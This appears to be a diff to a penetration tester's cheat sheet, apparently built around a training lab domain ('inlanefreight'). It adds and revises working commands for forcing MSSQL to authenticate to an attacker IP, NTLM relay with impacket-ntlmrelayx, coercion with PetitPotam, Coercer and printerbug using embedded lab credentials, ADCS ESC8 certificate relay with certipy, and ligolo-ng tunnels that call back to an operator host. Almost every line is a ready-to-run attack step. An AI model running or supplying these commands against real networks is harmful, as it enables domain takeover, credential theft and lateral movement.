@@ -512,7 +512,8 @@ EXEC master..xp_subdirs '\\10.10.14.23\anything\'
 EXEC master..xp_fileexist '\\10.10.14.23\anything\'
 
 # Enum
-SELECT name FROM master.dbo.sysdatabases;
+## SELECT name FROM master.dbo.sysdatabases;
+enum_db
 USE [DBname];
 SELECT * FROM [DBname].INFORMATION_SCHEMA.TABLES;
 ```
@@ -860,6 +861,7 @@ Enter-PSSession ws01.inlanefreight.local
 
 # Lateral Movement
 ## NTLM Relay 
+https://github.com/topotam/PetitPotam/blob/main/PetitPotam.py
 ```bash
 # Enum target SMB
 nxc smb 172.16.117.0/24 --gen-relay-list relayTargets.txt
@@ -872,12 +874,20 @@ impacket-ntlmrelayx --no-http-server -smb2support -t 192.168.50.212 -c
 impacket-ntlmrelayx -smb2support -tf relayTargets.txt -c
 
 # socks
+## SMB
 impacket-ntlmrelayx -smb2support -tf relayTargets.txt -socks
+## MSSQL
+impacket-ntlmrelayx -t "mssql://172.50.0.30" -smb2support -socks
 
 # add computer
 impacket-ntlmrelayx -t ldap://172.16.119.3 -smb2support --no-da --no-acl --add-computer 'plaintext$'
 # PC account escalate
 impacket-ntlmrelayx -t ldap://172.16.117.3 -smb2support --escalate-user 'plaintext$' --no-dump -debug
+
+# start relay
+python3 PetitPotam.py -u 'plaintext$' -p 'Password123!' -d 'lab.local' <My_IP> 172.16.119.70
+coercer scan -t 172.16.119.70 -u 'plaintext$' -p 'MTXr3(GW)lnljOj' -d INLANEFREIGHT.LOCAL -v
+python3 printerbug.py inlanefreight/plaintext$:'MTXr3(GW)lnljOj'@172.16.119.70 <My_IP>
 ```
 
 ### ESC 8
@@ -888,7 +898,7 @@ curl -I http://172.16.117.3/certsrv/
 # Relay
 impacket-ntlmrelayx -t http://172.16.117.3/certsrv/certfnsh.asp -smb2support --adcs --template "Machine"
 # Authentication Coercion
-Coercer scan -t 172.16.119.70 -u 'plaintext$' -p 'MTXr3(GW)lnljOj' -d INLANEFREIGHT.LOCAL -v
+coercer scan -t 172.16.119.70 -u 'plaintext$' -p 'MTXr3(GW)lnljOj' -d INLANEFREIGHT.LOCAL -v
 python3 printerbug.py inlanefreight/plaintext$:'MTXr3(GW)lnljOj'@172.16.119.70 <My_IP>
 # pfx
 
@@ -897,7 +907,7 @@ echo -n "MIIRPQIBAzCCEPcGCSqGSIb3DQEHAaCCEOgEghDkMIIQ4DCCBxcGCSqGSIb3DQEHBqCCBwg
 ```bash
 certipy relay -target "http://172.16.119.3" -template Machinene
 
-Coercer scan -t 172.16.119.70 -u 'plaintext$' -p 'MTXr3(GW)lnljOj' -d INLANEFREIGHT.LOCAL -v
+coercer scan -t 172.16.119.70 -u 'plaintext$' -p 'MTXr3(GW)lnljOj' -d INLANEFREIGHT.LOCAL -v
 
 certipy auth -pfx backup01.pfx -dc-ip 172.16.119.3
 ```
@@ -914,7 +924,7 @@ KRB5CCNAME=Administrator.ccache impacket-psexec -k -no-pass backup01.inlanefreig
 ```bash
 certipy relay -target "rpc://172.16.119.3" -ca "INLANEFREIGHT-DC01-CA"
 
-Coercer scan -t 172.16.119.70 -u 'plaintext$' -p 'MTXr3(GW)lnljOj' -d INLANEFREIGHT.LOCAL -v
+coercer scan -t 172.16.119.70 -u 'plaintext$' -p 'MTXr3(GW)lnljOj' -d INLANEFREIGHT.LOCAL -v
 
 certipy auth -pfx backup01.pfx -dc-ip 172.16.119.3
 ```
@@ -1912,16 +1922,14 @@ Stop-Process -Name chisel -Force
 https://github.com/nicocha30/ligolo-ng/releases
 ```bash
 # file
-wget https://github.com/nicocha30/ligolo-ng/releases/download/v0.6.2/ligolo-ng_proxy_0.6.2_linux_arm64.tar.gz
-tar -zxvf ligolo-ng_proxy_0.6.2_linux_arm64.tar.gz
+wget https://github.com/nicocha30/ligolo-ng/releases/download/v0.8.1/ligolo-ng_proxy_0.8.1_linux_amd64.tar.gz
+tar -zxvf ligolo-ng_proxy_0.8.1_linux_amd64.tar.gz
 
-wget https://github.com/nicocha30/ligolo-ng/releases/download/v0.6.2/ligolo-ng_agent_0.6.2_linux_amd64.tar.gz
-tar -zxvf ligolo-ng_agent_0.6.2_linux_amd64.tar.gz
-wget https://github.com/nicocha30/ligolo-ng/releases/download/v0.6.2/ligolo-ng_agent_0.6.2_windows_amd64.zip
-unzip ligolo-ng_agent_0.6.2_windows_amd64.zip
+wget https://github.com/nicocha30/ligolo-ng/releases/download/v0.8.1/ligolo-ng_agent_0.8.1_linux_amd64.tar.gz
+tar -zxvf ligolo-ng_agent_0.8.1_linux_amd64.tar.gz
+wget https://github.com/nicocha30/ligolo-ng/releases/download/v0.8.1/ligolo-ng_agent_0.8.1_windows_amd64.zip
+unzip ligolo-ng_agent_0.8.1_windows_amd64.zip
 
-sudo ip tuntap add user root mode tun ligolo
-sudo ip link set ligolo up
 sudo ./proxy -selfcert -laddr 0.0.0.0:2345
 
 ./agent -connect 192.168.45.10:2345 -ignore-cert
@@ -1929,7 +1937,9 @@ sudo ./proxy -selfcert -laddr 0.0.0.0:2345
 
 session 
 session : 1
-start 
+
+interface_create --name ligolo
+tunnel_start --tun ligolo
 ifconfig 
 
 sudo ip route add 172.16.0.0/16 dev ligolo
